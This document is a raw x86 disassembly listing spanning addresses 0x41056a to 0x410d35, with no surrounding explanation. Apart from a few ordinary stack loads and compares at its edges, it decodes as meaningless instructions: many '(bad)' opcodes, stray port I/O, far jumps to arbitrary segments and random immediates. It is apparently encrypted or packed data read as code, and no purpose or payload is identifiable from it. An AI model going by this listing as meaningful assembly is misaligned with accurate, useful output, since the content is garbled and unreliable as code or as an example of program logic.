  41056a:	scas   eax,DWORD PTR es:[edi]
  41056b:	xlat   BYTE PTR ds:[ebx]
  41056c:	mov    edi,DWORD PTR [ebp-0x8]
  41056f:	mov    ebx,DWORD PTR [ebp-0x10]
  410572:	jmp    0x4107fa
  410577:	cmp    al,0xd6
  410579:	ret    0xdac3
  41057c:	fcmovnb st,st(1)
  41057e:	aad    0xe1
  410580:	pop    es
  410581:	adc    ah,BYTE PTR [ecx]
  410583:	add    BYTE PTR [ebx+0x30],bh
  410586:	jmp    0x7ee5:0x78785339
  41058d:	js     0x410607
  41058f:	mov    bl,0x93
  410591:	mov    es,ebx
  410593:	cmp    eax,DWORD PTR [ecx+0x52ac486a]
  410599:	sub    cl,BYTE PTR [ebp+0x688d7d72]
  41059f:	jno    0x4105ce
  4105a1:	imul   ebx,DWORD PTR [eax-0x4c652c2d],0x63
  4105a8:	icebp  
  4105a9:	daa    
  4105aa:	mov    ebx,0xfe477f3b
  4105af:	fwait
  4105b0:	inc    edx
  4105b1:	mov    edx,0xc1f55842
  4105b6:	jmp    0x7488:0x98c6dce9
  4105bd:	push   ss
  4105be:	loopne 0x4105f8
  4105c0:	cs ja  0x4105de
  4105c3:	xor    BYTE PTR [ebx+0x10532bd5],bl
  4105c9:	(bad)  
  4105ca:	xchg   esi,eax
  4105cb:	ja     0x4105bd
  4105cd:	pushf  
  4105ce:	inc    ebp
  4105cf:	fnclex 
  4105d1:	sti    
  4105d2:	fld    TBYTE PTR [ebp-0x6de10ac7]
  4105d8:	repnz gs ds clc 
  4105dc:	inc    esi
  4105dd:	aas    
  4105de:	jmp    0x9cac4bc8
  4105e3:	sbb    DWORD PTR [ecx],esi
  4105e5:	(bad)  
  4105e6:	or     DWORD PTR [ecx],ebx
  4105e8:	xchg   ebp,eax
  4105e9:	mov    esi,0xa26c2a68
  4105ee:	xor    BYTE PTR [ebx],bl
  4105f0:	daa    
  4105f1:	mov    eax,0x1d1d55c4
  4105f6:	mov    eax,ds:0x3e6567a6
  4105fb:	aaa    
  4105fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105fd:	or     DWORD PTR [eax-0x42],ebp
  410600:	jle    0x41064a
  410602:	mov    ecx,0xc16b5764
  410607:	and    eax,0x86085c59
  41060c:	out    dx,al
  41060d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41060e:	out    dx,al
  41060f:	mov    ds:0xba9113bf,al
  410614:	jl     0x4105e3
  410616:	mov    ah,BYTE PTR [ebp+0x5cdef31b]
  41061c:	mov    cl,0xdf
  41061e:	and    DWORD PTR [ecx],ebp
  410620:	(bad)
  410625:	mov    dh,0x1f
  410627:	and    DWORD PTR [eax-0x3b],ecx
  41062a:	(bad)  
  41062c:	arpl   bx,bp
  41062e:	dec    esp
  41062f:	ret    
  410630:	(bad)
  410633:	mov    eax,ds:0x7664e124
  410638:	inc    ebp
  410639:	inc    ebx
  41063a:	shl    BYTE PTR [eax+0x369a8ceb],cl
  410640:	test   al,0x17
  410642:	jnp    0x4106a2
  410644:	fwait
  410645:	sahf   
  410646:	mov    ecx,0x89042829
  41064b:	dec    ecx
  41064c:	ins    BYTE PTR es:[edi],dx
  41064d:	xlat   BYTE PTR cs:[ebx]
  41064f:	nop
  410650:	mov    edx,0xa7748042
  410655:	sbb    DWORD PTR [eax],esp
  410657:	and    eax,0x1e7a4bfc
  41065c:	sbb    eax,0xeb2291dd
  410661:	(bad)  
  410662:	cli    
  410663:	ss add al,0xa3
  410666:	push   es
  410667:	inc    DWORD PTR [ecx]
  410669:	mov    ebp,0x6e480264
  41066e:	fs cmp al,0x86
  410671:	mov    esi,0xd8e86ac0
  410676:	xchg   ecx,eax
  410677:	cli    
  410678:	jbe    0x4106d8
  41067a:	imul   ebx,DWORD PTR [eax+ecx*4+0x12],0x50
  41067f:	(bad)  
  410680:	div    BYTE PTR [ecx+0x6a]
  410683:	adc    DWORD PTR [eax],esp
  410685:	sub    BYTE PTR [ebp+eax*1-0xf],0xe3
  41068a:	mov    ebp,0xea6cf10c
  41068f:	mov    dl,0x1d
  410691:	pushf  
  410692:	add    ch,BYTE PTR [edx-0x54]
  410695:	test   al,0xd2
  410697:	popf   
  410698:	(bad)  
  410699:	(bad)  
  41069a:	push   edi
  41069b:	lea    ebp,[edi+edi*4-0x59]
  41069f:	xor    DWORD PTR [eax],ebp
  4106a1:	mov    gs,WORD PTR [ebx+0x6b1b4b68]
  4106a7:	adc    ebp,DWORD PTR [ebp-0x14029ad3]
  4106ad:	arpl   WORD PTR [eax+0x4d],di
  4106b0:	push   edi
  4106b1:	or     dl,BYTE PTR [edi+0x2df069aa]
  4106b7:	clc    
  4106b8:	popa   
  4106b9:	mov    ds:0x84cd7089,al
  4106be:	sbb    eax,0xda4e6c69
  4106c3:	push   0xda513a8b
  4106c8:	push   esp
  4106c9:	and    ebx,DWORD PTR [eax+0x27]
  4106cc:	cli    
  4106cd:	pop    edi
  4106ce:	bound  ebx,QWORD PTR [ebp+0x78]
  4106d1:	fimul  WORD PTR [eax-0x38]
  4106d4:	mov    dl,0x8b
  4106d6:	push   ebp
  4106d7:	dec    eax
  4106d8:	popa   
  4106d9:	fisttp DWORD PTR [edx+0x55621b58]
  4106df:	sbb    BYTE PTR [ebx+ebx*2],dh
  4106e2:	or     ebp,ebp
  4106e4:	xchg   ecx,eax
  4106e5:	fldenv [eax+ecx*8-0x7a]
  4106e9:	js     0x410725
  4106eb:	in     eax,0x1c
  4106ed:	dec    edi
  4106ee:	xor    DWORD PTR [edi+0x47],ebx
  4106f1:	test   eax,0x26a43411
  4106f6:	dec    edx
  4106f7:	es js  0x4106c3
  4106fa:	push   edx
  4106fb:	mov    al,0x76
  4106fd:	stc    
  4106fe:	inc    edx
  4106ff:	cmp    al,0x6
  410701:	and    eax,DWORD PTR [ebx+eiz*1-0x29c2bae9]
  410708:	cmp    ecx,DWORD PTR [edx]
  41070a:	aad    0xa4
  41070c:	sbb    eax,DWORD PTR [edi+eiz*1]
  41070f:	and    eax,0x291bed07
  410714:	js     0x410774
  410716:	fcom   QWORD PTR [ecx+0x6076c12e]
  41071c:	and    al,0xa2
  41071e:	push   0xffffffc3
  410720:	add    eax,0xb282292e
  410725:	adc    ah,dh
  410727:	cmpxchg BYTE PTR [ecx-0x6d],al
  41072b:	pop    edi
  41072c:	popf   
  41072d:	lock sub bl,ch
  410730:	mov    BYTE PTR [ebp-0x6],cl
  410733:	sti    
  410734:	ins    BYTE PTR es:[edi],dx
  410735:	or     bl,BYTE PTR [ebx-0x1be9c506]
  41073b:	jns    0x4107a8
  41073d:	ins    BYTE PTR es:[edi],dx
  41073e:	jp     0x410780
  410740:	jl     0x410705
  410742:	mov    edi,0x840ce67d
  410747:	push   esi
  410748:	sub    DWORD PTR [eax+0x43],0x33
  41074c:	cmp    BYTE PTR [eax+0x701e442f],0x3
  410753:	nop
  410754:	inc    esi
  410755:	mov    al,0x57
  410757:	fwait
  410758:	pop    esi
  410759:	pop    edi
  41075a:	sar    BYTE PTR [edx+ebp*8-0x79],cl
  41075e:	adc    eax,DWORD PTR [esi]
  410760:	sti    
  410761:	adc    al,0x98
  410763:	jb     0x41070c
  410765:	push   0x1fe766a8
  41076a:	jbe    0x410755
  41076c:	add    BYTE PTR [edx+0x33c19174],0xa9
  410773:	out    dx,al
  410774:	fldcw  WORD PTR [esi+eax*2]
  410777:	(bad)  
  410778:	pop    ecx
  410779:	retf   
  41077a:	ror    esi,1
  41077c:	popa   
  41077d:	sbb    BYTE PTR [esp+eax*2],0x3e
  410781:	xchg   esi,eax
  410782:	and    al,0xa9
  410784:	imul   BYTE PTR [ebx-0x5c]
  410787:	nop
  410788:	fstp   DWORD PTR [esp+edi*4-0x2e163fac]
  41078f:	jae    0x410753
  410791:	fisub  DWORD PTR [esi-0x1]
  410794:	and    eax,0x36f023cb
  410799:	add    esp,DWORD PTR [eax]
  41079b:	mov    ds:0x33f42d15,al
  4107a0:	add    al,0x1b
  4107a2:	or     bh,cl
  4107a4:	ds (bad) 
  4107a6:	jmp    FWORD PTR [ecx-0x2c]
  4107a9:	mov    dh,0x9e
  4107ab:	shl    DWORD PTR [ebp+0x2376b198],1
  4107b1:	aam    0x39
  4107b3:	leave  
  4107b4:	ds xchg ecx,eax
  4107b6:	fbstp  TBYTE PTR [ebx]
  4107b8:	mov    bh,0x7a
  4107ba:	pop    ecx
  4107bb:	mov    ebx,0xa65d15bd
  4107c0:	pop    ss
  4107c1:	mov    ds,WORD PTR [ebx+ebp*2+0x180f57aa]
  4107c8:	sbb    dh,BYTE PTR [ecx+0x22]
  4107cb:	mov    ecx,0xe9577ceb
  4107d0:	push   edx
  4107d1:	ins    DWORD PTR es:[edi],dx
  4107d2:	or     al,BYTE PTR [ecx]
  4107d4:	and    edi,DWORD PTR [esi-0x5d]
  4107d7:	cmp    ecx,DWORD PTR [ebp-0x39]
  4107da:	mov    edx,0xf980921d
  4107df:	shr    BYTE PTR [ebp+0x4e287a28],cl
  4107e5:	mov    ah,BYTE PTR [ebx+0x1]
  4107e8:	popa   
  4107e9:	xor    ecx,ecx
  4107eb:	xor    al,0xaa
  4107ed:	push   ebp
  4107ee:	sub    al,0x9c
  4107f0:	cmp    BYTE PTR [eax+0x3fb03572],bh
  4107f6:	adc    DWORD PTR [eax+0x2b],eax
  4107f9:	addr16 sub ebx,edi
  4107fc:	cmp    ebx,edx
  4107fe:	jmp    0x410a86
  410803:	into   
  410804:	ror    ebx,0xc8
  410807:	fcmovnbe st,st(6)
  410809:	fld    st(1)
  41080b:	ud0    edi,esp
  41080e:	pop    ds
  41080f:	cmp    edx,DWORD PTR [eax]
  410811:	outs   dx,DWORD PTR ds:[esi]
  410812:	lods   al,BYTE PTR ds:[esi]
  410813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410814:	push   ecx
  410815:	js     0x41088f
  410817:	in     eax,0x7e
  410819:	js     0x410893
  41081b:	inc    esp
  41081c:	push   0xf16cefa0
  410821:	inc    esp
  410822:	or     esi,esi
  410824:	enter  0x80df,0xdc
  410828:	leave  
  410829:	jg     0x41087c
  41082b:	je     0x4107fc
  41082d:	and    cl,BYTE PTR [ecx]
  41082f:	into   
  410830:	pop    esi
  410831:	retf   
  410832:	push   ecx
  410833:	cli    
  410834:	mov    eax,DWORD PTR [esi+0x1]
  410837:	hlt    
  410838:	add    edx,ecx
  41083a:	mov    al,ds:0x7a48469a
  41083f:	fcomp  QWORD PTR [esi+0x4e]
  410842:	call   0xe44a:0x31a30054
  410849:	je     0x410848
  41084b:	retf   0x7b67
  41084e:	push   ecx
  41084f:	in     eax,dx
  410850:	mov    ds:0xb4c92c34,eax
  410855:	sahf   
  410856:	imul   ebx,DWORD PTR [edx],0x913be003
  41085c:	gs or  eax,0x16aa6be2
  410863:	xor    al,0x37
  410865:	out    0x9d,al
  410867:	jnp    0x4108cc
  410869:	add    eax,0x74deba42
  41086e:	xor    bl,BYTE PTR [esp+edx*8+0x63676c9e]
  410875:	ds jge 0x41088e
  410878:	retf   0x537e
  41087b:	push   0xffffff9b
  41087d:	in     al,dx
  41087e:	mov    dh,0x10
  410880:	aam    0x6a
  410882:	sub    BYTE PTR [edi+0x2ae76a41],0x2f
  410889:	xchg   DWORD PTR [edx+ecx*8-0x39],edx
  41088d:	sbb    eax,0xf80a5c6f
  410892:	lea    esi,[esi+0x34]
  410895:	retf   
  410896:	mov    dl,0x3f
  410898:	je     0x410869
  41089a:	jmp    0xa491:0x7729cf8b
  4108a1:	ss leave 
  4108a3:	aad    0x14
  4108a5:	pop    ss
  4108a6:	jge    0x4108cf
  4108a8:	xlat   BYTE PTR ds:[ebx]
  4108a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108ab:	jp     0x41084c
  4108ad:	(bad)  
  4108ae:	dec    edx
  4108af:	add    DWORD PTR [ecx+0x66d2fbc5],ecx
  4108b5:	and    al,0xb9
  4108b7:	scas   al,BYTE PTR es:[edi]
  4108b8:	pop    ss
  4108b9:	jae    0x410921
  4108bb:	and    esi,DWORD PTR [ebp+0x1070bbeb]
  4108c1:	loope  0x410864
  4108c3:	jne    0x410902
  4108c5:	lock push 0x4b
  4108c8:	mov    WORD PTR [eax],ds
  4108ca:	adc    BYTE PTR ds:0x5349038c,0x1e
  4108d1:	fxch   st(0)
  4108d3:	lods   al,BYTE PTR ds:[esi]
  4108d4:	arpl   WORD PTR [ecx+0x4cdaf48],cx
  4108da:	lods   eax,DWORD PTR ds:[esi]
  4108db:	clc    
  4108dc:	adc    eax,DWORD PTR [ebx+0x7d]
  4108df:	jnp    0x41090f
  4108e1:	in     eax,dx
  4108e2:	jl     0x41092d
  4108e4:	dec    edx
  4108e5:	outs   dx,DWORD PTR ds:[esi]
  4108e6:	push   cs
  4108e7:	pop    ebx
  4108e8:	add    bl,BYTE PTR [edx-0x57]
  4108eb:	arpl   WORD PTR [eax+0x36],di
  4108ee:	icebp  
  4108ef:	mov    edx,0xacbb327e
  4108f4:	and    bh,BYTE PTR [edi]
  4108f6:	outs   dx,DWORD PTR ds:[esi]
  4108f7:	pop    esi
  4108f8:	push   esi
  4108f9:	arpl   WORD PTR [ebx],dx
  4108fb:	repz mov bl,0xf7
  4108fe:	sar    BYTE PTR [ecx-0x22],1
  410901:	mov    ebp,0x17c1e1bf
  410906:	push   0xe6597bf5
  41090b:	in     al,dx
  41090c:	lds    ebx,FWORD PTR [edi]
  41090e:	or     eax,0x546139b1
  410913:	add    DWORD PTR [edi-0x217a868a],edi
  410919:	in     al,0xd5
  41091b:	sbb    BYTE PTR ds:0xc49af515,dh
  410921:	inc    edx
  410922:	push   ebp
  410923:	pop    ss
  410924:	(bad)  
  410925:	std    
  410926:	xor    DWORD PTR [edx-0xf],edx
  410929:	inc    esp
  41092a:	bound  edi,QWORD PTR [edi+0x4e69b568]
  410930:	shl    BYTE PTR [eax],cl
  410932:	aam    0x22
  410934:	fwait
  410935:	lahf   
  410936:	call   0xc536306b
  41093b:	sbb    eax,0xd24667ac
  410940:	cmc    
  410941:	call   0xb04de528
  410946:	fsubr  st,st(4)
  410948:	push   0xc78056f8
  41094d:	jl     0x41097b
  41094f:	dec    esp
  410950:	pop    ds
  410951:	sti    
  410952:	stos   DWORD PTR es:[edi],eax
  410953:	lods   eax,DWORD PTR ds:[esi]
  410954:	and    DWORD PTR [eax],ebp
  410956:	pop    edx
  410957:	dec    edx
  410958:	xor    eax,0x45d35189
  41095d:	mov    ah,0x71
  41095f:	ins    BYTE PTR es:[edi],dx
  410960:	and    eax,0xb247ceff
  410965:	bound  esi,QWORD PTR [esi-0x30e2d062]
  41096b:	pusha  
  41096c:	sbb    ah,BYTE PTR [esi+ebx*8]
  41096f:	popf   
  410970:	cmp    al,0x47
  410972:	xchg   eax,eax
  410974:	pop    ebp
  410975:	jl     0x4109d7
  410977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410978:	cmp    al,0x28
  41097a:	cmp    bl,BYTE PTR [edx-0x5b]
  41097d:	sbb    eax,0x8aeb4bb8
  410982:	outs   dx,DWORD PTR ds:[esi]
  410983:	jge    0x410933
  410985:	in     eax,dx
  410986:	jnp    0x410916
  410988:	cmp    eax,0x2ffeefc9
  41098d:	clc    
  41098e:	sbb    eax,DWORD PTR [ecx+0xc]
  410991:	and    DWORD PTR [ebx+0x2f1f9a14],ecx
  410997:	dec    ebp
  410998:	adc    al,0xa5
  41099a:	rcr    edx,1
  41099c:	and    al,BYTE PTR es:[eax+0x65]
  4109a0:	mov    ecx,0xf1e26e0d
  4109a5:	bound  esi,QWORD PTR [ecx]
  4109a7:	arpl   WORD PTR [ecx+0x6f],ax
  4109aa:	jbe    0x4109d4
  4109ac:	push   cs
  4109ad:	jo     0x4109b5
  4109af:	jmp    0xc5b9:0xf531936c
  4109b6:	push   esp
  4109b7:	mov    bh,0xcd
  4109b9:	jl     0x4109f1
  4109bb:	retf   0xbc12
  4109be:	sbb    ebp,DWORD PTR [esi-0x7e]
  4109c1:	sbb    al,0xec
  4109c3:	aas    
  4109c4:	sbb    esi,ecx
  4109c6:	pop    DWORD PTR [eax]
  4109c8:	sahf   
  4109c9:	cld    
  4109ca:	(bad)  
  4109cb:	cli    
  4109cc:	int3   
  4109cd:	rcr    BYTE PTR [edi-0x31c558d],cl
  4109d3:	rep ins BYTE PTR es:[edi],dx
  4109d5:	and    BYTE PTR [esi+0x5b],ah
  4109d8:	mov    esp,0xa528b821
  4109dd:	xlat   BYTE PTR ds:[ebx]
  4109de:	ficom  WORD PTR [edx+ecx*2-0x51]
  4109e2:	lea    edx,[esi+0x79]
  4109e5:	adc    ebp,esi
  4109e7:	jnp    0x410a63
  4109e9:	imul   esp,DWORD PTR [edx],0x43
  4109ec:	fnstsw WORD PTR [esi+0xa16146c]
  4109f2:	add    BYTE PTR [esi],dh
  4109f4:	add    DWORD PTR [edx],0xffffffad
  4109f7:	fisttp DWORD PTR [ecx-0x5c]
  4109fa:	mov    edx,0xb338d0e0
  4109ff:	push   es
  410a00:	push   ds
  410a01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a02:	xlat   BYTE PTR ds:[ebx]
  410a03:	sub    DWORD PTR [edi+0x86c6a58],0x258f1979
  410a0d:	adc    BYTE PTR [ebx],ah
  410a0f:	push   esi
  410a10:	retf   0x61ef
  410a13:	fstp   DWORD PTR [esi-0x6ea3ef1c]
  410a19:	push   ecx
  410a1a:	scas   al,BYTE PTR es:[edi]
  410a1b:	shl    DWORD PTR [edi+0x4e],1
  410a1e:	push   es
  410a1f:	jns    0x4109d6
  410a21:	push   ebx
  410a22:	push   esi
  410a23:	into   
  410a24:	je     0x410a9f
  410a26:	push   edi
  410a27:	stos   BYTE PTR es:[edi],al
  410a28:	mov    dh,0x59
  410a2a:	popa   
  410a2b:	add    DWORD PTR [edx],edi
  410a2d:	xor    DWORD PTR [ebx+0xdc28e3],0xd064731
  410a37:	adc    BYTE PTR [edx+0x20f2e60d],ah
  410a3d:	mov    BYTE PTR [ebp+edx*4-0x5a],bh
  410a41:	xchg   ebx,eax
  410a42:	cmp    BYTE PTR [ecx],ah
  410a44:	pushf  
  410a45:	push   cs
  410a46:	xchg   edx,eax
  410a47:	les    ebx,FWORD PTR [ecx+0x73]
  410a4a:	scas   eax,DWORD PTR es:[edi]
  410a4b:	jmp    0xc8b5:0x235d89cf
  410a52:	push   es
  410a53:	mov    ch,0xa0
  410a55:	(bad)
  410a58:	scas   al,BYTE PTR es:[edi]
  410a59:	pop    edi
  410a5a:	ror    BYTE PTR [ecx],cl
  410a5c:	ret    0xac02
  410a5f:	xor    ah,BYTE PTR [eax+0x3c]
  410a62:	push   ecx
  410a63:	lea    esi,[esi]
  410a65:	xor    al,0xa3
  410a67:	int    0xcf
  410a69:	stos   BYTE PTR es:[edi],al
  410a6a:	mov    eax,0xdf757bc0
  410a6f:	daa    
  410a70:	add    dl,BYTE PTR ds:0xbab8ccdf
  410a76:	iret   
  410a77:	dec    ecx
  410a78:	jecxz  0x410a48
  410a7a:	pop    ebx
  410a7b:	lods   al,BYTE PTR gs:[esi]
  410a7d:	in     eax,dx
  410a7e:	adc    DWORD PTR [esi-0x34118fa2],esi
  410a84:	mov    ds:0x8870fe3,eax
  410a89:	add    BYTE PTR [eax],al
  410a8b:	add    BYTE PTR [ebx-0x1d1627ab],cl
  410a91:	adc    al,0x0
  410a93:	add    BYTE PTR [ebx+0x7d8bd055],cl
  410a99:	cld    
  410a9a:	xor    edx,eax
  410a9c:	xor    edi,eax
  410a9e:	jmp    0x410d26
  410aa3:	aas    
  410aa4:	retf   
  410aa5:	iret   
  410aa6:	(bad)
  410aa9:	aad    0xc9
  410aab:	jo     0x410a57
  410aad:	lods   eax,DWORD PTR ds:[esi]
  410aae:	neg    edx
  410ab0:	xor    ebx,esp
  410ab2:	fist   DWORD PTR [ebx]
  410ab4:	push   esi
  410ab5:	js     0x410b2f
  410ab7:	in     eax,0x7e
  410ab9:	js     0x410b33
  410abb:	pop    ds
  410abc:	add    DWORD PTR [ebx],esp
  410abe:	sbb    BYTE PTR [eax],cl
  410ac0:	aad    0x6
  410ac2:	mov    al,0xe
  410ac4:	imul   DWORD PTR [edi-0x3f453058]
  410aca:	and    eax,0x6f70d38e
  410acf:	popf   
  410ad0:	cmp    al,BYTE PTR [edx-0x25]
  410ad3:	mov    ds:0x1aebcaea,eax
  410ad8:	test   eax,0x80c957b2
  410add:	pop    ebp
  410ade:	mov    al,0x8a
  410ae0:	sti    
  410ae1:	inc    edi
  410ae2:	dec    ebp
  410ae3:	sahf   
  410ae4:	dec    edi
  410ae5:	outs   dx,DWORD PTR ds:[esi]
  410ae6:	jae    0x410a9f
  410ae8:	mov    dh,0x41
  410aea:	fwait
  410aeb:	pop    esi
  410aec:	xor    eax,0xe6cadc6b
  410af1:	xor    BYTE PTR [edx+0x590248d0],dl
  410af7:	nop
  410af8:	pusha  
  410af9:	inc    edx
  410afa:	lods   eax,DWORD PTR ds:[esi]
  410afb:	loopne 0x410b0f
  410afd:	shl    ebx,1
  410aff:	mov    dh,0xc5
  410b01:	ss lahf 
  410b03:	out    0xab,eax
  410b05:	(bad)  
  410b06:	int    0x9c
  410b08:	mov    eax,ds:0xafa8e05b
  410b0d:	je     0x410abd
  410b0f:	xchg   esp,eax
  410b10:	hlt    
  410b11:	pop    ebp
  410b12:	push   eax
  410b13:	ja     0x410ac8
  410b15:	jnp    0x410ab9
  410b17:	jge    0x410ae4
  410b19:	clc    
  410b1a:	add    al,0xa0
  410b1c:	fstp   st(6)
  410b1e:	enter  0xdaa,0xfc
  410b22:	pushf  
  410b23:	repz jmp 0xf597d894
  410b29:	std    
  410b2a:	pop    edi
  410b2b:	sbb    DWORD PTR [esi-0x434c802c],edi
  410b31:	xchg   ebp,eax
  410b32:	push   ecx
  410b33:	mov    bl,0x21
  410b35:	icebp  
  410b36:	jae    0x410ad3
  410b38:	jmp    0xa0fc1157
  410b3d:	push   cs
  410b3e:	push   ebp
  410b3f:	adc    ebp,DWORD PTR [esi-0x1df165da]
  410b45:	mov    ebp,0xb4ea6815
  410b4a:	test   DWORD PTR [ebx],edx
  410b4c:	scas   al,BYTE PTR es:[edi]
  410b4d:	mov    al,0x38
  410b4f:	sti    
  410b50:	pop    ss
  410b51:	ds pop eax
  410b53:	add    DWORD PTR [edx+esi*1],esi
  410b56:	ja     0x410b5c
  410b58:	xchg   edi,eax
  410b59:	adc    eax,0xe889978a
  410b5e:	ins    BYTE PTR es:[edi],dx
  410b5f:	mov    ah,0x35
  410b61:	xor    eax,0x9e67f7f5
  410b66:	rcl    BYTE PTR [ebx-0x5875d1a5],0xe8
  410b6d:	pop    ds
  410b6e:	adc    al,0xf2
  410b70:	and    bl,ah
  410b72:	adc    DWORD PTR [ecx+0x7a],ecx
  410b75:	mov    ah,dl
  410b77:	ins    BYTE PTR es:[edi],dx
  410b78:	int3   
  410b79:	inc    eax
  410b7a:	shl    DWORD PTR [ebp+0xe04dc97],1
  410b80:	in     al,0x41
  410b82:	rcl    dl,cl
  410b84:	pop    edx
  410b85:	stos   DWORD PTR es:[edi],eax
  410b86:	cdq    
  410b87:	(bad)  [eax+0x38]
  410b8a:	mov    bl,0xb1
  410b8c:	and    al,0x4d
  410b8e:	lahf   
  410b8f:	and    esp,edx
  410b91:	jno    0x410b83
  410b93:	inc    ecx
  410b94:	or     cl,ah
  410b96:	mov    ecx,0xe0c9cb3b
  410b9b:	(bad)  
  410b9d:	es pop ebx
  410b9f:	aam    0xe6
  410ba1:	jg     0x410b97
  410ba3:	dec    esp
  410ba4:	pop    esp
  410ba5:	xor    edx,esp
  410ba7:	loopne 0x410b38
  410ba9:	dec    edx
  410baa:	xor    al,0xa2
  410bac:	or     eax,0x53490931
  410bb1:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  410bb3:	jp     0x410bb2
  410bb5:	and    al,0xf5
  410bb7:	sbb    bh,BYTE PTR [esi]
  410bb9:	not    DWORD PTR [edi-0x25]
  410bbc:	sbb    DWORD PTR [eax],esp
  410bbe:	(bad)  
  410bc0:	test   DWORD PTR ds:0xb46cf39c,ebp
  410bc6:	xchg   ecx,eax
  410bc7:	jnp    0x410b93
  410bc9:	dec    edi
  410bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bcb:	std    
  410bcc:	xor    eax,0x311ce32b
  410bd1:	aam    0xbf
  410bd3:	lock push es
  410bd5:	sbb    al,0x43
  410bd7:	lods   al,BYTE PTR ds:[esi]
  410bd8:	stos   BYTE PTR es:[edi],al
  410bd9:	or     al,0x55
  410bdb:	lahf   
  410bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bdd:	jno    0x410c41
  410bdf:	push   esp
  410be0:	jb     0x410c59
  410be2:	sar    DWORD PTR [edx-0x6e],1
  410be5:	repnz scas al,BYTE PTR es:[edi]
  410be7:	inc    ebx
  410be8:	add    eax,0xee36f315
  410bed:	sahf   
  410bee:	iret   
  410bef:	xor    ecx,DWORD PTR [eax+0x242cb7fa]
  410bf5:	sub    eax,0x3da8d5cb
  410bfa:	outs   dx,DWORD PTR ds:[esi]
  410bfb:	sti    
  410bfc:	(bad)  
  410bfd:	(bad)  
  410bfe:	shl    DWORD PTR [ebx+0x38],1
  410c01:	jmp    0x356a:0xd186a173
  410c08:	lods   al,BYTE PTR ds:[esi]
  410c09:	ins    DWORD PTR es:[edi],dx
  410c0a:	mov    al,ds:0x1839468e
  410c0f:	push   eax
  410c10:	mov    dl,BYTE PTR [esi+0x6c4dc8eb]
  410c16:	adc    esp,DWORD PTR [ebp-0x5fa2e01c]
  410c1c:	sub    eax,0x16404f59
  410c21:	cld    
  410c22:	adc    edx,DWORD PTR [ebp-0x11dd6b0]
  410c28:	int    0xf4
  410c2a:	or     esi,DWORD PTR [edi-0x6e]
  410c2d:	adc    ebx,0x1f3cefd
  410c33:	mov    ecx,0x38248977
  410c38:	cmp    edx,DWORD PTR [ebx]
  410c3a:	mov    ecx,0x4902853d
  410c3f:	retf   
  410c40:	pop    ecx
  410c41:	push   ebp
  410c42:	loop   0x410c75
  410c44:	aaa    
  410c45:	xchg   edx,eax
  410c46:	shl    BYTE PTR [esi-0x6e775537],cl
  410c4c:	lods   al,BYTE PTR ds:[esi]
  410c4d:	int    0x97
  410c4f:	jmp    0x822758ba
  410c54:	(bad)  
  410c55:	or     al,0x76
  410c57:	aam    0x43
  410c59:	mov    edi,0x9217674
  410c5e:	enter  0xce44,0xfb
  410c62:	mov    ebp,DWORD PTR [esi]
  410c64:	push   0x9f9eb052
  410c69:	fidivr WORD PTR [edx]
  410c6b:	sbb    al,0x9
  410c6d:	and    BYTE PTR ds:0xf25a0a88,cl
  410c73:	lahf   
  410c74:	jmp    0x7af83b74
  410c79:	jl     0x410c81
  410c7b:	adc    ch,BYTE PTR ds:0x83013311
  410c81:	dec    eax
  410c82:	xor    eax,0xb568701f
  410c87:	adc    BYTE PTR [eax],dl
  410c89:	in     eax,dx
  410c8a:	les    edx,FWORD PTR [eax+edi*4]
  410c8d:	add    al,0xbc
  410c8f:	jnp    0x410c80
  410c91:	push   ebx
  410c92:	mov    ds:0xdad5c363,eax
  410c97:	inc    edx
  410c98:	mov    ah,BYTE PTR [edx+eax*2]
  410c9b:	dec    esp
  410c9c:	ror    DWORD PTR [ebx+0x54],0xed
  410ca0:	push   es
  410ca1:	and    eax,0x91417d5
  410ca6:	lock add ch,BYTE PTR [eax-0x504eab04]
  410cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cae:	mov    edx,DWORD PTR [esi+0x2]
  410cb1:	retf   
  410cb2:	fiadd  WORD PTR [ebx]
  410cb4:	inc    eax
  410cb5:	push   ecx
  410cb6:	jmp    0xd763eb58
  410cbb:	in     al,0x80
  410cbd:	stos   BYTE PTR es:[edi],al
  410cbe:	stos   DWORD PTR es:[edi],eax
  410cbf:	aas    
  410cc0:	mov    ebp,eax
  410cc2:	adc    DWORD PTR [ebp+ebp*8-0x78e6601f],0x70
  410cca:	cmp    eax,0x3981653c
  410ccf:	in     eax,0x1b
  410cd1:	jb     0x410cbd
  410cd3:	push   ecx
  410cd4:	sbb    BYTE PTR [ebp+0x5a2f5b11],cl
  410cda:	dec    eax
  410cdb:	jl     0x410c98
  410cdd:	fstp   DWORD PTR [ebp+0x16]
  410ce0:	pop    ebx
  410ce1:	scas   eax,DWORD PTR es:[edi]
  410ce2:	sub    BYTE PTR [esi+0x3c95cf1d],dl
  410ce8:	mov    ebp,0xe01ef383
  410ced:	mov    WORD PTR [ecx],gs
  410cef:	push   es
  410cf0:	sub    esp,DWORD PTR [edi-0x13639175]
  410cf6:	cmp    bh,BYTE PTR [eax]
  410cf8:	cmp    cl,al
  410cfa:	xor    al,0x25
  410cfc:	mov    WORD PTR [esi-0x509d4705],cs
  410d02:	(bad)  
  410d04:	inc    ebx
  410d05:	ja     0x410c8d
  410d07:	add    cl,BYTE PTR [eiz*1-0x77f60d0f]
  410d0e:	push   esi
  410d0f:	inc    ebx
  410d10:	js     0x410d2c
  410d12:	mov    ecx,0x91278404
  410d17:	jge    0x410d15
  410d19:	mov    edi,0x77edb323
  410d1e:	not    BYTE PTR [edx+edi*4+0x69]
  410d22:	inc    edi
  410d23:	sahf   
  410d24:	inc    edi
  410d25:	xor    eax,DWORD PTR [ebx]
  410d27:	stc    
  410d28:	add    edx,ecx
  410d2a:	imul   edx,edi
  410d2d:	mov    edi,DWORD PTR [ebp-0x8]
  410d30:	mov    ebx,DWORD PTR [ebp-0x10]
  410d33:	sub    ebx,edi
  410d35:	cmp    ebx,edx
